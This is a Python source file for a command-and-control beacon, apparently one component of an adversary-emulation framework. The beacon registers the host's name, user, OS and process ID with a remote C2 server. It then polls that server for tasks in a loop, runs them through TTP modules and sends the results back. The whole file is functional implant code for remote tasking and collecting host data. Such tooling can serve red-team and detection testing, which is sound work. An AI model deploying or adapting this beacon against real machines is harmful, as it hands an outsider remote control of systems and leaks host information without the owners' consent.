"""
Beacon — polls the C2 server for tasks and executes TTP modules.

Run from the C2/ directory:
    python -m beacon.beacon
"""

import os
import platform
import random
import socket
import sys
import time
from datetime import datetime, timezone

import requests

from .dispatcher import dispatch

C2_URL = os.environ.get("C2_URL", "http://127.0.0.1:8000")
SLEEP_BASE = int(os.environ.get("C2_SLEEP", "5"))
SLEEP_JITTER = int(os.environ.get("C2_JITTER", "2"))


def _sleep() -> None:
    time.sleep(SLEEP_BASE + random.uniform(-SLEEP_JITTER, SLEEP_JITTER))


def _register() -> str:
    payload = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER") or "unknown",
        "os": platform.system(),
        "pid": os.getpid(),
    }
    r = requests.post(f"{C2_URL}/beacon/register", json=payload, timeout=10)
    r.raise_for_status()
    return r.json()["beacon_id"]


def _poll(beacon_id: str) -> list[dict]:
    r = requests.get(f"{C2_URL}/beacon/{beacon_id}/tasks", timeout=10)
    r.raise_for_status()
    return r.json()["tasks"]


def _report(beacon_id: str, task_id: str, status: str, output: str, telemetry: dict) -> None:
    payload = {
        "task_id": task_id,
        "beacon_id": beacon_id,
        "status": status,
        "output": output,
        "telemetry": telemetry,
        "completed_at": datetime.now(timezone.utc).isoformat(),
    }
    requests.post(f"{C2_URL}/results", json=payload, timeout=10)


def run() -> None:
    beacon_id = _register()
    print(f"[*] registered  beacon_id={beacon_id}  c2={C2_URL}", flush=True)

    while True:
        try:
            tasks = _poll(beacon_id)
            for task in tasks:
                tid = task["task_id"]
                print(f"[>] task  id={tid[:8]}  type={task['type']}", flush=True)
                status, output, telemetry = dispatch(task["type"], task["params"])
                _report(beacon_id, tid, status, output, telemetry)
                print(f"[<] result  id={tid[:8]}  status={status}", flush=True)
        except requests.ConnectionError:
            print("[!] c2 unreachable, retrying…", flush=True)
        except Exception as exc:
            print(f"[!] error: {exc}", flush=True)

        _sleep()


if __name__ == "__main__":
    run()
